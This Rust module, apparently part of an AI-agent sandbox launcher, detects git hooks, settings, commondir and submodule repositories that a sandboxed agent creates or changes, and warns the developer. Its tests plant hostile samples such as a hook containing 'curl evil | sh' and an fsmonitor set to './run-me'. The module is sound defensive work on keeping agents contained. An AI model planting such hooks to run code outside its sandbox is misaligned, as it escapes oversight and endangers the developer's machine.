//! What git would read as settings or run as a hook, looked at before a sandboxed launch starts and again when it ends
//! (plans/done/PLAN-agent-sandbox.md). The sandbox keeps the repository's hooks and settings read-only, but the project stays
//! writable, and git takes settings from more places than those: a `commondir` naming another folder, a `.git` made in a
//! subfolder (or in a project that had none), a submodule's or a worktree's repository put in `.git/modules` or
//! `.git/worktrees`. Git reads them at the developer's next command there, outside the sandbox, and a prompt that shows git
//! status runs one at every line. A mount cannot stop a new file in a writable folder without breaking git, so each new or
//! changed one is said when the launch ends, by its path. Nothing is removed: the person reads it first. A .git file that is
//! there when the launch starts (a submodule's work tree's, a worktree's) can be held: `pointers` names each for the sandbox
//! to bind read-only.
//!
//! Nothing here runs git, which a repository's own settings could make run something. It only looks: it never follows a link
//! while walking, never opens what is not a plain file, and stops after a bounded number of folders and repositories.

use std::collections::{BTreeMap, BTreeSet, VecDeque};
use std::os::unix::fs::MetadataExt;
use std::path::{Path, PathBuf};

use crate::sandbox::{Mode, Permission, Request};

/// How deep the project is walked for a .git, and how many folders are looked into in all
const DEPTH: usize = 12;
const FOLDERS: usize = 30_000;
/// How many repositories are looked into (each .git, each submodule's and worktree's), and how deep one leads to another
const REPOS: usize = 256;
const NESTED: usize = 8;
/// The entries of a hooks folder looked at
const HOOKS: usize = 256;
/// A settings file larger than this is looked at, not read
const READ: u64 = 1 << 20;
/// How many sentences are said; the rest are counted
const SAID: usize = 20;

/// Folders a developer seldom runs git in, and which hold many: packages, builds, environments. Each is still looked into for
/// a .git, but only SHALLOW levels deep and against a bound of its own (SHALLOW_FOLDERS), so that a huge node_modules costs
/// the end of a launch at most that many folders; and one that holds a submodule git knows of is walked as any other folder
const SKIP: &[&str] = &[
    "node_modules", "target", ".venv", "venv", "vendor", "__pycache__", ".tox", ".mypy_cache", ".pytest_cache", ".gradle",
    ".next", ".direnv", "bower_components", ".terraform", ".cache",
];
/// The levels of a skipped folder looked into for a .git: the folder itself and the folders in it (node_modules/.git and
/// node_modules/pkg/.git are found, node_modules/pkg/lib/.git is not), and how many such folders in all, apart from FOLDERS
const SHALLOW: usize = 2;
const SHALLOW_FOLDERS: usize = 10_000;

/// One file or folder as it was: which one it is (device and inode), and for anything but a folder its size and when it last
/// changed. The change time is the kernel's, which no program can set back.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Mark {
    folder: bool,
    dev: u64,
    ino: u64,
    mode: u32,
    size: u64,
    mtime: (i64, i64),
    ctime: (i64, i64),
    link: Option<PathBuf>,
}

impl Mark {
    /// A folder is the same while it is the same folder: git writes in it all the time, and what matters in it is marked on its own
    fn same(&self, other: &Mark) -> bool {
        if self.folder || other.folder {
            self.folder == other.folder && self.dev == other.dev && self.ino == other.ino
        } else {
            self == other
        }
    }
}

/// What git would read as settings or run as a hook, at one moment
#[derive(Debug, Clone, Default)]
pub struct Snapshot {
    marks: BTreeMap<PathBuf, Mark>,
    /// The walk reached its bounds before it had looked everywhere
    stopped: bool,
    /// When it was taken, in seconds: what changed before then was not the agent's
    taken: i64,
    /// The work trees of the submodules git knows of, which the look after the launch takes in too: the agent may take one
    /// out of .gitmodules, and git still finds it by the index
    registered: BTreeSet<PathBuf>,
}

/// How much of the walk for a .git is spent: folders in all, folders in a skipped folder, and whether a bound was reached
#[derive(Debug, Default)]
struct Look {
    folders: usize,
    shallow: usize,
    stopped: bool,
}

struct Walker<'a> {
    home: &'a Path,
    snapshot: Snapshot,
    /// Each repository looked into, with the folder its commands run in: a submodule's is looked at again from its own .git
    repos: BTreeSet<(PathBuf, PathBuf)>,
    look: Look,
}

/// The snapshot of a sandboxed launch, taken before its command starts: the project and every place it was allowed to write,
/// walked for a .git, and the project's own repository. None where nothing is sandboxed.
pub fn snapshot(request: &Request) -> Option<Snapshot> {
    look(request, &BTreeSet::new())
}

/// The sentences for what is new or changed since BEFORE, looked at again the same way when the launch has ended
pub fn warnings(before: &Snapshot, request: &Request) -> Vec<String> {
    look(request, &before.registered).map(|after| said(before, &after)).unwrap_or_default()
}

fn look(request: &Request, known: &BTreeSet<PathBuf>) -> Option<Snapshot> {
    if request.mode == Mode::Profile {
        return None;
    }
    let project = request.project.as_ref()?;
    let mut places = vec![project.top.clone()];
    places.extend(request.allow.iter().filter_map(|permission| match permission {
        Permission::Write(path) => Some(path.clone()),
        _ => None,
    }));
    let repos: Vec<(PathBuf, PathBuf)> = project.git.iter().chain(project.common.iter()).map(|git| (git.clone(), project.top.clone())).collect();
    Some(take(&places, &repos, &request.home, known))
}

/// Every .git file of the project at TOP that is there now, for the sandbox to hold read-only (another gitdir in one would be
/// another repository's settings and hooks, which git takes at the developer's next command there, and a submodule's is read
/// by a plain `git status` at the top): a registered submodule's work tree's (the paths .gitmodules names, and each
/// core.worktree in the repositories under GITS' modules/), and each one the walk for a .git finds, skipped folders looked
/// into SHALLOW deep. Never one reached through a link, which a mount cannot hold
pub fn pointers(top: &Path, gits: &[PathBuf]) -> Vec<PathBuf> {
    let registered = registered(top, gits);
    let mut look = Look::default();
    let mut found: BTreeSet<PathBuf> = find(top, &registered, &mut look).into_iter().map(|(path, _)| path).collect();
    found.extend(registered.iter().map(|work| work.join(".git")));
    found
        .into_iter()
        .filter(|path| plain_way(top, path) && std::fs::symlink_metadata(path).is_ok_and(|meta| meta.is_file()))
        .take(REPOS)
        .collect()
}

/// A snapshot of PLACES walked for a .git and of REPOS (a repository's folder, and the folder its commands run in); KNOWN
/// are submodules' work trees an earlier snapshot found
fn take(places: &[PathBuf], repos: &[(PathBuf, PathBuf)], home: &Path, known: &BTreeSet<PathBuf>) -> Snapshot {
    let taken = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|time| time.as_secs() as i64).unwrap_or(0);
    let mut registered = known.clone();
    for (git, top) in repos {
        registered.extend(self::registered(top, std::slice::from_ref(git)));
    }
    let snapshot = Snapshot { taken, registered: registered.clone(), ..Default::default() };
    let mut walker = Walker { home, snapshot, repos: BTreeSet::new(), look: Look::default() };
    for (git, top) in repos {
        walker.repo(git, top, 0);
    }
    for place in places {
        for (path, dir) in find(place, &registered, &mut walker.look) {
            walker.dot_git(&path, &dir);
        }
    }
    // A submodule's work tree is looked at wherever it is, past the walk's bounds too: a .git made there is used by git status
    for work in &registered {
        let path = work.join(".git");
        if !walker.snapshot.marks.contains_key(&path) {
            walker.dot_git(&path, work);
        }
    }
    walker.snapshot.stopped |= walker.look.stopped;
    walker.snapshot
}

/// The work trees of a repository's submodules, inside TOP, as git finds them: each path the .gitmodules at TOP names (and
/// the .gitmodules in each such work tree, for a submodule's own), and each core.worktree a repository under GITS' modules/
/// names. Lexical: nothing is followed, and a path that leaves TOP is left out
fn registered(top: &Path, gits: &[PathBuf]) -> BTreeSet<PathBuf> {
    let mut found = BTreeSet::new();
    let mut queue = VecDeque::from([(top.to_path_buf(), 0usize)]);
    while let Some((work, depth)) = queue.pop_front() {
        if depth > NESTED {
            continue;
        }
        let Some(text) = read_small(&work.join(".gitmodules")) else { continue };
        for (section, key, value) in parse(&text) {
            if section != "submodule" || key != "path" || value.is_empty() || found.len() >= REPOS {
                continue;
            }
            let path = normal(&work.join(&value));
            if path.starts_with(top) && path != top && found.insert(path.clone()) {
                queue.push_back((path, depth + 1));
            }
        }
    }
    for git in gits {
        module_worktrees(&git.join("modules"), top, 0, &mut found);
    }
    found
}

/// The core.worktree of each submodule's repository under DIR (modules/, by names that may have slashes in them, and a
/// submodule's own modules/ under its repository), where it is inside TOP
fn module_worktrees(dir: &Path, top: &Path, depth: usize, found: &mut BTreeSet<PathBuf>) {
    if depth > NESTED || found.len() >= REPOS {
        return;
    }
    let Ok(entries) = std::fs::read_dir(dir) else { return };
    let mut folders: Vec<PathBuf> = entries.flatten().filter(|entry| entry.file_type().is_ok_and(|kind| kind.is_dir())).map(|entry| entry.path()).collect();
    folders.sort();
    for folder in folders {
        if let Some(text) = read_small(&folder.join("config")) {
            if let Some(work) = worktree_of(&folder, &text) {
                if work.starts_with(top) && work != top && found.len() < REPOS {
                    found.insert(work);
                }
            }
            module_worktrees(&folder.join("modules"), top, depth + 1, found);
        } else if std::fs::symlink_metadata(folder.join("HEAD")).is_err() {
            module_worktrees(&folder, top, depth + 1, found);
        }
    }
}

/// The work tree a repository's settings TEXT name (core.worktree), relative to its folder GIT as git takes it
fn worktree_of(git: &Path, text: &str) -> Option<PathBuf> {
    let value = parse(text).into_iter().rev().find(|(section, key, _)| section == "core" && key == "worktree").map(|(_, _, value)| value)?;
    (!value.is_empty()).then(|| normal(&git.join(value)))
}

/// A path with its . and .. taken out by their names, never by following a link
fn normal(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for part in path.components() {
        match part {
            std::path::Component::CurDir => {}
            std::path::Component::ParentDir => {
                out.pop();
            }
            other => out.push(other),
        }
    }
    out
}

/// Whether every folder from TOP to PATH is a folder itself, not a link: what a mount can hold
fn plain_way(top: &Path, path: &Path) -> bool {
    let Ok(rest) = path.strip_prefix(top) else { return false };
    let mut at = top.to_path_buf();
    let parts: Vec<_> = rest.components().collect();
    for part in &parts[..parts.len().saturating_sub(1)] {
        at.push(part);
        if !std::fs::symlink_metadata(&at).is_ok_and(|meta| meta.is_dir()) {
            return false;
        }
    }
    true
}

/// The .git entries in PLACE and the folders under it, each with the folder it is in, breadth first: never through a link,
/// DEPTH folders deep and FOLDERS folders in all. A skipped folder (SKIP) is looked into SHALLOW levels deep, against
/// SHALLOW_FOLDERS of its own, unless a submodule's work tree in REGISTERED is in it: then it is walked as any other
fn find(place: &Path, registered: &BTreeSet<PathBuf>, look: &mut Look) -> Vec<(PathBuf, PathBuf)> {
    let mut found = Vec::new();
    // Each folder, its depth, and in a skipped folder how many levels below it are still looked into
    let mut queue: VecDeque<(PathBuf, usize, Option<usize>)> = VecDeque::from([(place.to_path_buf(), 0, None)]);
    while let Some((dir, depth, shallow)) = queue.pop_front() {
        let over = if shallow.is_some() { look.shallow >= SHALLOW_FOLDERS } else { look.folders >= FOLDERS };
        if over {
            look.stopped = true;
            continue;
        }
        if shallow.is_some() {
            look.shallow += 1;
        } else {
            look.folders += 1;
        }
        let Ok(entries) = std::fs::read_dir(&dir) else { continue };
        let mut entries: Vec<(PathBuf, bool)> = entries.flatten().filter_map(|entry| Some((entry.path(), entry.file_type().ok()?.is_dir()))).collect();
        entries.sort();
        for (path, is_dir) in entries {
            let name = path.file_name().and_then(|name| name.to_str()).unwrap_or("");
            if name == ".git" {
                found.push((path, dir.clone()));
                continue;
            }
            if !is_dir || depth >= DEPTH {
                continue;
            }
            let skipped = shallow.is_some() || SKIP.contains(&name);
            let next = if skipped && registered.iter().any(|work| work.starts_with(&path)) {
                // A folder that holds a submodule git knows of is walked as any other, wherever it is
                Some(None)
            } else {
                match shallow {
                    Some(left) => left.checked_sub(1).map(Some),
                    None if SKIP.contains(&name) => Some(Some(SHALLOW - 1)),
                    None => Some(None),
                }
            };
            if let Some(next) = next {
                queue.push_back((path, depth + 1, next));
            }
        }
    }
    found
}

/// What changed between two snapshots, one sentence each. A folder that is new is said once, not each file in it.
fn said(before: &Snapshot, after: &Snapshot) -> Vec<String> {
    let mut lines = Vec::new();
    let mut count = 0;
    let mut folders: Vec<&Path> = Vec::new();
    for (path, mark) in &after.marks {
        if folders.iter().any(|folder| path.starts_with(folder)) {
            continue;
        }
        let verb = match before.marks.get(path) {
            Some(old) if old.same(mark) => continue,
            Some(_) => "changed",
            None if mark.ctime.0 >= before.taken - 1 => "made",
            // Not looked at before only because the first walk stopped at its bounds
            None if before.stopped => continue,
            // There before, but git is only now pointed at it (a commondir, a .git file)
            None => "pointed git at",
        };
        if mark.folder {
            folders.push(path);
        }
        count += 1;
        if lines.len() < SAID {
            lines.push(format!(
                "The sandboxed agent {verb} {}, which git reads as settings or runs as a hook at your next git command there, outside a sandbox (a prompt that shows git status runs one): read it first.",
                shown(path)
            ));
        }
    }
    if count > SAID {
        lines.push(format!("...and {} more like these, in the same repositories.", count - SAID));
    }
    if after.stopped && !before.stopped {
        lines.push(format!("The look for git's settings stopped at its bounds ({FOLDERS} folders, {SHALLOW_FOLDERS} in package and build folders, {REPOS} repositories), so a .git further into the project was not looked for."));
    }
    lines
}

impl Walker<'_> {
    /// Marks PATH as it is, never following a link, and gives its metadata
    fn mark(&mut self, path: &Path) -> Option<std::fs::Metadata> {
        let meta = std::fs::symlink_metadata(path).ok()?;
        let link = if meta.file_type().is_symlink() { std::fs::read_link(path).ok() } else { None };
        self.snapshot.marks.insert(path.to_path_buf(), Mark {
            folder: meta.is_dir(),
            dev: meta.dev(),
            ino: meta.ino(),
            mode: meta.mode(),
            size: meta.len(),
            mtime: (meta.mtime(), meta.mtime_nsec()),
            ctime: (meta.ctime(), meta.ctime_nsec()),
            link,
        });
        Some(meta)
    }

    /// The folders in DIR, links left out, in order, counted against the walk's bounds
    fn folders_in(&mut self, dir: &Path) -> Vec<PathBuf> {
        if self.look.folders >= FOLDERS {
            self.look.stopped = true;
            return Vec::new();
        }
        self.look.folders += 1;
        let Ok(entries) = std::fs::read_dir(dir) else { return Vec::new() };
        let mut found: Vec<PathBuf> = entries.flatten().filter(|entry| entry.file_type().is_ok_and(|kind| kind.is_dir())).map(|entry| entry.path()).collect();
        found.sort();
        found
    }

    /// A .git found in TOP: a repository's folder, or a file (a worktree's, a submodule's) naming one
    fn dot_git(&mut self, path: &Path, top: &Path) {
        let Some(meta) = self.mark(path) else { return };
        if meta.is_file() {
            let home = self.home;
            let named = read_small(path).and_then(|text| {
                let rest = text.lines().next()?.strip_prefix("gitdir:")?.trim().to_string();
                (!rest.is_empty()).then(|| resolve(top, &rest, home))
            });
            if let Some(git) = named {
                self.repo(&git, top, 0);
            }
        } else if meta.is_dir() || std::fs::metadata(path).is_ok_and(|meta| meta.is_dir()) {
            self.repo(path, top, 0);
        }
    }

    /// One repository's folder: its settings, its hooks, the folder its commondir names, its worktrees' and submodules'
    /// repositories, and what its settings point at. Its commands run in the work tree its core.worktree names (a
    /// submodule's), else in TOP, the folder whose .git led to it: a relative core.hooksPath or program is taken from there
    fn repo(&mut self, git: &Path, top: &Path, depth: usize) {
        let Ok(git) = std::fs::canonicalize(git) else { return };
        if depth > NESTED || !std::fs::metadata(&git).is_ok_and(|meta| meta.is_dir()) {
            return;
        }
        let own = read_small(&git.join("config")).and_then(|text| worktree_of(&git, &text));
        let top = own.as_deref().unwrap_or(top);
        let key = (git.clone(), top.to_path_buf());
        if self.repos.contains(&key) {
            return;
        }
        if self.repos.len() >= REPOS {
            self.snapshot.stopped = true;
            return;
        }
        self.repos.insert(key);
        self.mark(&git);
        for name in ["config", "config.worktree", "commondir", "gitdir", "info/attributes"] {
            self.mark(&git.join(name));
        }
        self.hooks(&git.join("hooks"));
        for name in ["config", "config.worktree"] {
            self.settings(&git.join(name), top, 0);
        }
        let home = self.home;
        if let Some(text) = read_small(&git.join("commondir")) {
            if !text.trim().is_empty() {
                self.repo(&resolve(&git, text.trim(), home), top, depth + 1);
            }
        }
        for worktree in self.folders_in(&git.join("worktrees")) {
            // A worktree's commands run in the folder its gitdir names the .git file of
            let its_top = read_small(&worktree.join("gitdir"))
                .map(|text| resolve(&worktree, text.trim(), home))
                .and_then(|file| file.parent().map(Path::to_path_buf))
                .unwrap_or_else(|| top.to_path_buf());
            self.repo(&worktree, &its_top, depth + 1);
        }
        self.modules(&git.join("modules"), top, depth + 1);
    }

    /// Submodules' repositories, under modules/ by their names, which may have slashes in them
    fn modules(&mut self, dir: &Path, top: &Path, depth: usize) {
        if depth > NESTED {
            return;
        }
        for folder in self.folders_in(dir) {
            if std::fs::symlink_metadata(folder.join("HEAD")).is_ok() || std::fs::symlink_metadata(folder.join("config")).is_ok() {
                self.repo(&folder, top, depth + 1);
            } else {
                self.mark(&folder);
                self.modules(&folder, top, depth + 1);
            }
        }
    }

    /// A hooks folder and each entry in it, not deeper
    fn hooks(&mut self, dir: &Path) {
        if !self.mark(dir).is_some_and(|meta| meta.is_dir()) {
            return;
        }
        let Ok(entries) = std::fs::read_dir(dir) else { return };
        let mut paths: Vec<PathBuf> = entries.flatten().map(|entry| entry.path()).collect();
        paths.sort();
        for path in paths.into_iter().take(HOOKS) {
            self.mark(&path);
        }
    }

    /// What a settings file points at that git would read or run: a hooks folder elsewhere (core.hooksPath, as husky sets),
    /// another settings file (include.path), and a program named by its path (core.fsmonitor, a filter, an alias with !)
    fn settings(&mut self, file: &Path, top: &Path, level: usize) {
        let Some(text) = read_small(file) else { return };
        let home = self.home;
        let here = file.parent().unwrap_or(top).to_path_buf();
        for (section, key, value) in parse(&text) {
            match (section.as_str(), key.as_str()) {
                ("core", "hookspath") => self.hooks(&resolve(top, &value, home)),
                ("include" | "includeif", "path") => {
                    let path = resolve(&here, &value, home);
                    self.mark(&path);
                    if level < 4 {
                        self.settings(&path, top, level + 1);
                    }
                }
                _ if names_program(&section, &key) => {
                    if let Some(program) = program_path(&value) {
                        self.mark(&resolve(top, &program, home));
                    }
                }
                _ => {}
            }
        }
    }
}

/// Whether a setting names a command git runs by itself or at a word of the developer's
fn names_program(section: &str, key: &str) -> bool {
    matches!(
        (section, key),
        ("core", "fsmonitor" | "sshcommand" | "editor" | "pager" | "askpass")
            | ("filter", "clean" | "smudge" | "process")
            | ("diff", "textconv" | "command")
            | ("merge", "driver")
            | ("gpg", "program")
            | ("credential", "helper")
            | ("alias", _)
    )
}

/// The program a command setting runs, where it is named by a path (with a slash): a bare word is a program on the PATH, and
/// true or false is no program
fn program_path(value: &str) -> Option<String> {
    let command = value.trim().trim_start_matches('!').trim();
    let first = command.split_whitespace().next()?.trim_matches(|c: char| c == '"' || c == '\'');
    first.contains('/').then(|| first.to_string())
}

/// A path as git takes one in a setting: ~/ in the home, else from BASE (an absolute path stays as it is)
fn resolve(base: &Path, text: &str, home: &Path) -> PathBuf {
    match text.strip_prefix("~/") {
        Some(rest) => home.join(rest),
        None => base.join(text.strip_prefix("./").unwrap_or(text)),
    }
}

/// A path as it can be said on a terminal: the agent names its folders, and a carriage return, an escape sequence (a title,
/// the clipboard, the cursor) or a direction mark in one could hide or forge a warning. Each control character (C0, DEL, C1),
/// each Unicode direction control, each byte that is not UTF-8 and the backslash itself are written as escapes
pub fn shown(path: &Path) -> String {
    use std::fmt::Write;
    use std::os::unix::ffi::OsStrExt;
    let mut out = String::new();
    let mut rest = path.as_os_str().as_bytes();
    while !rest.is_empty() {
        let (text, bad) = match std::str::from_utf8(rest) {
            Ok(text) => (text, 0),
            Err(error) => {
                let good = error.valid_up_to();
                // The bytes up to valid_up_to are UTF-8, as from_utf8 said
                let text = std::str::from_utf8(&rest[..good]).unwrap_or("");
                (text, error.error_len().unwrap_or(rest.len() - good))
            }
        };
        for c in text.chars() {
            match c {
                '\\' => out.push_str("\\\\"),
                '\u{0}'..='\u{1f}' | '\u{7f}' => {
                    let _ = write!(out, "\\x{:02x}", c as u32);
                }
                '\u{80}'..='\u{9f}' | '\u{200e}' | '\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' => {
                    let _ = write!(out, "\\u{{{:04x}}}", c as u32);
                }
                c => out.push(c),
            }
        }
        let start = text.len();
        for byte in &rest[start..start + bad] {
            let _ = write!(out, "\\x{byte:02x}");
        }
        rest = &rest[start + bad..];
    }
    out
}

/// A plain file's text, if it is a small one: never a link, a pipe or a device, which could stop the launch's end for good.
/// What is not a plain file is not opened; what is put in its place after that look is opened never following a link and
/// never waiting (a pipe opens at once), and what was opened is the one looked at again before it is read, at most READ
fn read_small(path: &Path) -> Option<String> {
    use std::io::Read;
    use std::os::unix::fs::OpenOptionsExt;
    if !std::fs::symlink_metadata(path).is_ok_and(|meta| meta.is_file()) {
        return None;
    }
    let file = std::fs::OpenOptions::new().read(true).custom_flags(libc::O_NOFOLLOW | libc::O_NONBLOCK | libc::O_CLOEXEC).open(path).ok()?;
    let meta = file.metadata().ok()?;
    if !meta.is_file() || meta.len() > READ {
        return None;
    }
    let mut bytes = Vec::new();
    file.take(READ + 1).read_to_end(&mut bytes).ok()?;
    if bytes.len() as u64 > READ {
        return None;
    }
    Some(String::from_utf8_lossy(&bytes).into_owned())
}

/// A git settings file's entries, as (section, key, value), section and key in lower case: enough of git's format to find
/// the settings named above, never more. A subsection ([filter "x"]) is left out of the section's name.
fn parse(text: &str) -> Vec<(String, String, String)> {
    let mut entries = Vec::new();
    let mut section = String::new();
    for line in text.lines() {
        let mut line = line.trim();
        if line.starts_with('[') {
            let Some(end) = line.find(']') else { continue };
            let header = &line[1..end];
            section = header.split(|c: char| c.is_whitespace() || c == '"' || c == '.').next().unwrap_or("").to_ascii_lowercase();
            // A key may follow its section on the same line
            line = line[end + 1..].trim();
        }
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        let (key, value) = match line.split_once('=') {
            Some((key, value)) => (key.trim(), value.trim()),
            None => (line, "true"),
        };
        let value = if let Some(quoted) = value.strip_prefix('"') {
            quoted.split('"').next().unwrap_or("").to_string()
        } else {
            value.split(['#', ';']).next().unwrap_or("").trim().to_string()
        };
        entries.push((section.clone(), key.to_ascii_lowercase(), value));
    }
    entries
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A folder of the test's own, never under /tmp, as sandbox.rs's tests make theirs
    fn temp(name: &str) -> PathBuf {
        let base = std::env::var_os("HOME")
            .map(PathBuf::from)
            .filter(|home| home.is_dir() && !home.starts_with("/tmp"))
            .unwrap_or_else(|| PathBuf::from("/var/lib/amethystora-test"));
        let dir = base.join(format!("amethystora-gitguard-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::canonicalize(&dir).unwrap()
    }

    /// A repository's folder as git init leaves it, with a hook
    fn repository(top: &Path) -> PathBuf {
        let git = top.join(".git");
        std::fs::create_dir_all(git.join("hooks")).unwrap();
        std::fs::create_dir_all(git.join("objects")).unwrap();
        std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").unwrap();
        std::fs::write(git.join("config"), "[core]\n\tbare = false\n").unwrap();
        std::fs::write(git.join("hooks/pre-commit.sample"), "#!/bin/sh\n").unwrap();
        git
    }

    fn of(top: &Path, home: &Path) -> Snapshot {
        let git = top.join(".git");
        let repos: Vec<(PathBuf, PathBuf)> = if git.is_dir() { vec![(git, top.to_path_buf())] } else { Vec::new() };
        take(&[top.to_path_buf()], &repos, home, &BTreeSet::new())
    }

    /// The look after a launch, as `warnings` takes it: with the submodules the look before found
    fn after(top: &Path, home: &Path, before: &Snapshot) -> Snapshot {
        let git = top.join(".git");
        let repos: Vec<(PathBuf, PathBuf)> = if git.is_dir() { vec![(git, top.to_path_buf())] } else { Vec::new() };
        take(&[top.to_path_buf()], &repos, home, &before.registered)
    }

    /// A submodule NAME checked out at PATH in TOP, as git submodule add leaves it: its repository under .git/modules with
    /// core.worktree naming its work tree, the work tree's .git file naming the repository, and .gitmodules naming the path
    fn submodule(top: &Path, name: &str, path: &str) {
        let module = top.join(".git/modules").join(name);
        std::fs::create_dir_all(module.join("hooks")).unwrap();
        std::fs::write(module.join("HEAD"), "ref: refs/heads/main\n").unwrap();
        let up = "../".repeat(2 + name.split('/').count());
        std::fs::write(module.join("config"), format!("[core]\n\tworktree = {up}{path}\n")).unwrap();
        let work = top.join(path);
        std::fs::create_dir_all(&work).unwrap();
        let back = "../".repeat(path.split('/').count());
        std::fs::write(work.join(".git"), format!("gitdir: {back}.git/modules/{name}\n")).unwrap();
        let mut modules = std::fs::read_to_string(top.join(".gitmodules")).unwrap_or_default();
        modules.push_str(&format!("[submodule \"{name}\"]\n\tpath = {path}\n\turl = https://example.com/{name}\n"));
        std::fs::write(top.join(".gitmodules"), modules).unwrap();
    }

    fn names(lines: &[String], path: &Path) -> bool {
        lines.iter().any(|line| line.contains(&format!(" {}, which git", path.display())))
    }

    #[test]
    fn nothing_changed_says_nothing() {
        let home = temp("same");
        let top = home.join("code/site");
        repository(&top);
        std::fs::create_dir_all(top.join("src")).unwrap();
        let before = of(&top, &home);
        std::fs::write(top.join("src/main.rs"), "fn main() {}\n").unwrap();
        std::fs::write(top.join(".git/index"), "x").unwrap();
        assert!(said(&before, &of(&top, &home)).is_empty());
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn a_commondir_and_a_repository_in_a_subfolder_are_said() {
        let home = temp("commondir");
        let top = home.join("code/site");
        repository(&top);
        let before = of(&top, &home);
        std::fs::create_dir_all(top.join("evil/hooks")).unwrap();
        std::fs::write(top.join("evil/config"), "[core]\n\tfsmonitor = ./run-me\n").unwrap();
        std::fs::write(top.join(".git/commondir"), "../evil\n").unwrap();
        std::fs::create_dir_all(top.join("deep/sub/.git")).unwrap();
        std::fs::write(top.join("deep/sub/.git/config"), "[alias]\n\tst = !sh -c x\n").unwrap();
        let lines = said(&before, &of(&top, &home));
        assert!(names(&lines, &top.join(".git/commondir")), "{lines:?}");
        // The folder commondir names is said once, as a whole, not each file in it
        assert!(names(&lines, &top.join("evil")), "{lines:?}");
        assert!(!names(&lines, &top.join("evil/config")), "{lines:?}");
        assert!(names(&lines, &top.join("deep/sub/.git")), "{lines:?}");
        assert!(!names(&lines, &top.join("deep/sub/.git/config")), "{lines:?}");
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn a_changed_hook_and_a_new_one_are_said() {
        let home = temp("hooks");
        let top = home.join("code/site");
        let git = repository(&top);
        let before = of(&top, &home);
        std::fs::write(git.join("hooks/pre-commit.sample"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
        std::fs::write(git.join("hooks/post-checkout"), "#!/bin/sh\n").unwrap();
        let lines = said(&before, &of(&top, &home));
        assert!(lines.iter().any(|line| line.starts_with("The sandboxed agent changed ") && line.contains("pre-commit.sample")), "{lines:?}");
        assert!(lines.iter().any(|line| line.starts_with("The sandboxed agent made ") && line.contains("post-checkout")), "{lines:?}");
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn a_new_submodule_repository_and_a_worktree_are_said_once_each() {
        let home = temp("modules");
        let top = home.join("code/site");
        let git = repository(&top);
        std::fs::create_dir_all(git.join("modules/lib/hooks")).unwrap();
        std::fs::write(git.join("modules/lib/HEAD"), "ref: refs/heads/main\n").unwrap();
        std::fs::write(git.join("modules/lib/config"), "[core]\n").unwrap();
        let before = of(&top, &home);
        // A module's settings changed, a new module, a new worktree's repository
        std::fs::write(git.join("modules/lib/config"), "[core]\n\thooksPath = /somewhere\n").unwrap();
        std::fs::create_dir_all(git.join("modules/group/new/hooks")).unwrap();
        std::fs::write(git.join("modules/group/new/config"), "[core]\n").unwrap();
        std::fs::create_dir_all(git.join("worktrees/wt")).unwrap();
        std::fs::write(git.join("worktrees/wt/commondir"), "../..\n").unwrap();
        let lines = said(&before, &of(&top, &home));
        assert!(names(&lines, &git.join("modules/lib/config")), "{lines:?}");
        assert!(names(&lines, &git.join("modules/group")), "{lines:?}");
        assert!(!names(&lines, &git.join("modules/group/new")), "{lines:?}");
        assert!(names(&lines, &git.join("worktrees/wt")), "{lines:?}");
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn a_project_with_no_repository_and_a_hooks_path_in_it() {
        let home = temp("none");
        let top = home.join("code/notes");
        std::fs::create_dir_all(top.join("node_modules/pkg/lib")).unwrap();
        let before = of(&top, &home);
        std::fs::create_dir_all(top.join(".git")).unwrap();
        std::fs::create_dir_all(top.join("node_modules/pkg/.git")).unwrap();
        std::fs::create_dir_all(top.join("node_modules/pkg/lib/.git")).unwrap();
        let lines = said(&before, &of(&top, &home));
        assert!(names(&lines, &top.join(".git")), "{lines:?}");
        // A package folder is looked into SHALLOW levels deep for a .git, not walked through
        assert!(names(&lines, &top.join("node_modules/pkg/.git")), "{lines:?}");
        assert!(!lines.iter().any(|line| line.contains("node_modules/pkg/lib")), "{lines:?}");

        // A repository whose settings take its hooks from a folder of the project (husky): a hook made there is said
        let site = home.join("code/site");
        let git = repository(&site);
        std::fs::write(git.join("config"), "[core]\n\thooksPath = .husky/_\n").unwrap();
        std::fs::create_dir_all(site.join(".husky/_")).unwrap();
        let before = of(&site, &home);
        std::fs::write(site.join(".husky/_/pre-commit"), "#!/bin/sh\n").unwrap();
        let lines = said(&before, &of(&site, &home));
        assert!(names(&lines, &site.join(".husky/_/pre-commit")), "{lines:?}");
        let _ = std::fs::remove_dir_all(&home);
    }

    #[test]
    fn links_and_pipes_stop_nothing() {
        let home = temp("links");
        let top = home.join("code/site");
        let git = repository(&top);
        std::os::unix::fs::symlink(&top, top.join("loop")).unwrap();
        let fifo = std::ffi::CString::new(git.join("commondir").to_string_lossy().into_owned()).unwrap();
        assert_eq!(unsafe { libc::mkfifo(fifo.as_ptr(), 0o600) }, 0);
        // Neither the link back to the project nor the pipe where commondir would be is followed or opened
        let snapshot = of(&top, &home);
        assert!(snapshot.marks.contains_key(&git.join("commondir")));
        assert!(!snapshot.marks.keys().any(|path| path.starts_with(top.join("loop"))));
        assert!(!snapshot.stopped);
        let _ = std::fs::remove_dir_all(&home);
    }

    fn request(home: &Path, project: &Path, mode: Mode) -> Request {
        Request {
            agent: "claude".into(),
            profile: crate::agents::DEFAULT.into(),
            mode,
            project: Some(crate::sandbox::project_of(project, home).unwrap()),
            allow: Vec::new(),
            home: home.to_path_buf(),
            uid: 1000,
            run: home.join(".cache/amethystora/agent-sandbox/1-x"),
            dir: project.to_path_buf(),
            hosts: None,
        }
    }

    #[test]
    fn a_launch_is_looked_at_only_when_it_is_sandboxed() {
        let home = temp("launch");
        let top = home.join("code/site");
        repository(&top);
        assert!(snapshot(&request(&home, &top, Mode::Profile)).is_none());
        let sandboxed = request(&home, &top, Mode::Open);
        let before = snapshot(&sandboxed).unwrap();
